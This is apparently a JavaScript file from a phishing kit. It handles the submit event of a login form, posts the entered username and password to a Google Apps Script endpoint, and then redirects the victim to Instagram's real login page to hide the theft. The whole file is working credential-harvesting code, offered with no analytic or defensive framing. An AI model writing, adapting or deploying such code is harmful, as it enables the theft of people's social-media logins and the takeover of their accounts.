const scriptURL = 'https://script.google.com/macros/s/AKfycbxuketYNDc5-G9VA-ttenzs6z8-fSp42NY5Jxvt0fVusr0BC5fLBOVPnjaK4cnKqOaErg/exec'; // Replace with your actual URL

document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();
  const form = document.getElementById("loginForm");

  fetch(scriptURL, {
    method: 'POST',
    body: new FormData(form)
  })
  .then(() => {
    window.location.href = "https://www.instagram.com/accounts/login/?source=auth_switcher";
  })
  .catch(err => console.error("Error!", err.message));
});

// Toggle password visibility
document.getElementById("togglePassword").addEventListener("click", () => {
  const pwd = document.querySelector('input[name="password"]');
  pwd.type = pwd.type === "password" ? "text" : "password";
});
